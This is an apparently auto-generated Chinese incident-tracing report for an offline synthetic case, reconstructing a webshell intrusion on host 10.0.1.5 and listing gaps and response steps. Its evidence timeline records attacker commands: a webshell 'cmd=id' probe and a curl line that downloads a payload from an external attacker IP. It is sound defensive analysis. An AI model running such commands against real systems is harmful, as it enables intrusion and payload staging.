# 数据取数统计

离线合成案例；本次未连接 ES/SLS、使用凭证或发送通知。

查询计数来自结果元数据；输入预录的查询成功／超时也会计入，不能视为本次真实联网。

| 记录数 | 累计取数 | 请求 | 查询 | 失败查询 | 查询完整性 |
|---|---|---|---|---|---|
| 9 | 0 | 0 | 0 | 0 | unknown |

| 数据类型 | 记录数 |
|---|---|
| waf\_alert | 1 |
| web\_access\_log | 1 |
| host\_exec | 2 |
| host\_connect | 1 |
| host\_file\_op | 1 |
| ssh\_auth | 1 |
| firewall\_log | 0 |
| asset\_inventory | 2 |

| 去重 | 窗口过滤 | 截断类型 |
|---|---|---|
| 0 | 0 | \[\] |

逐资产取数明细为空；离线输入不等于生产环境完整覆盖。

| 开始时间 | 结束时间 | 告警锚点 |
|---|---|---|
| 2026-06-23T10:00:00+08:00 | 2026-06-23T14:00:00+08:00 | 2026-06-23T11:05:00+08:00 |

## 主机执行但无确认横向

**结构化结果报告（自动生成，尚待智能体证据复核）。** 本文不声称已完成 AI 叙事分析。

案例：s2-initial-access-no-lateral；Skill：traceability-analysis。

### 结论

观察到主机执行，未确认横向成功（initial\_access\_only）

| 原始置信度 | 顶层上限 | 证据约束建议上限 | 证据范围 |
|---|---|---|---|
| 0.75 | 0.75 | 0.85 | supplied\_evidence\_only |

规则判定不等于每个攻击阶段都已证实；空结果或未达阈值不能证明安全。应同时考虑证据约束上限。

### 入口与横向证据

| 观察目标 | 入口角色 | 首次攻破点状态 | URL | 主要证据 |
|---|---|---|---|---|
| 10.0.1.5 | observed\_control\_point | unresolved | http://10.0.1.5/upload/1.php | \["web-201"\] |

观察到的控制点不等于原始攻破方式；规范化 URL、关联边和 ATT&CK 标签需结合原始证据复核。

| 横向分类 | 来源 | 目标 | 账号 | 确认时间 | 证据 |
|---|---|---|---|---|---|

| 影响目标（脚本标签） | 角色 | 排查优先级 |
|---|---|---|
| 10.0.1.5 | initial\_compromise | P0 |

| 建议动作 |
|---|
| 立即隔离初始受害主机: 10.0.1.5 |
| 保全 WEB 与 SSH 相关日志，冻结当前时间窗证据 |
| 重置横向涉及主机上的可疑账号密码，检查 SSH 密钥 |

ATT&CK（规则映射）：\["T1190", "T1059", "T1505.003", "T1059.004"\]。

### 原始证据时间线

| 时间 | 来源 | 证据 ID | 主机／目标 | 记录 |
|---|---|---|---|---|
| 未提供 | asset\_inventory | 未提供 | 未提供 | {"hostname": "web-01", "ip": "10.0.1.5", "zone": "dmz"} |
| 未提供 | asset\_inventory | 未提供 | 未提供 | {"hostname": "db-01", "ip": "10.0.2.10", "zone": "internal"} |
| 2026-06-23T11:04:58+08:00 | web\_access\_log | web-201 | web-01 | 来源：203.0.113.88；方法：POST；路径：/upload/1.php；响应状态：200 |
| 2026-06-23T11:05:00+08:00 | waf\_alert | waf-201 | web-01 | 来源：203.0.113.88；路径：/upload/1.php?cmd=id；载荷：cmd=id；动作：block |
| 2026-06-23T11:06:12+08:00 | host\_exec | exec-201 | web-01 | 命令：id |
| 2026-06-23T11:07:00+08:00 | host\_file\_op | file-201 | web-01 | 动作：create；文件：/var/www/html/upload/1.php |
| 2026-06-23T11:08:28+08:00 | host\_connect | connect-201 | web-01 | 目的：203.0.113.88；目的端口：80 |
| 2026-06-23T11:08:30+08:00 | host\_exec | exec-202 | web-01 | 命令：curl -o /tmp/x http://203.0.113.88/payload.sh |
| 2026-06-23T11:15:00+08:00 | ssh\_auth | ssh-201 | db-01 | 来源：10.0.1.5；用户：root；结果：Failed |

### 数据缺口与结论边界

- ssh\_auth 覆盖不全，无法确认横向
- no\_match:victim\_host\_to\_waf\_by\_target\_ip (已知受害 host\_ip（params.target\_ip），反查 WAF 告警（upstream\_addr→target\_ip）并还原攻击源 src\_ip)
- no\_match:victim\_host\_to\_web\_access\_by\_target\_ip (已知受害 host\_ip，反查网关 access（upstream\_addr→target\_ip）并关联 web\_access\_to\_host\_exec)
- no\_match:web\_access\_to\_host\_exec (WEB 请求落到主机命令执行（攻击是否成功）)
- no\_match:host\_connect\_to\_dns (外连 IP 解析对应域名（C2/下载站）)
- no\_match:attacker\_ip\_to\_ssh\_auth (外网攻击 IP 是否尝试/成功 SSH 登录)
- no\_match:ssh\_auth\_to\_host\_exec\_same\_host (SSH 登录成功后主机上的命令执行)
- no\_match:host\_to\_cmdb (主机行为映射到资产清单（区域、负责人、服务）)
- not\_evaluated:host\_connect\_to\_dns (missing asset\_type: dns\_log)

上述动作均为建议，本次未执行隔离、封禁或凭证修改。

### 可复核来源

[离线输入](</Users/op/Desktop/%E9%A1%B9%E7%9B%AE/secweaver-community-0.3.21/examples/traceability/s2-initial-access-no-lateral.json>) · [本次 JSON](</Users/op/Desktop/%E9%A1%B9%E7%9B%AE/secweaver-community-0.3.21/outputs/ai-showcase/s2-initial-access-no-lateral.json>)
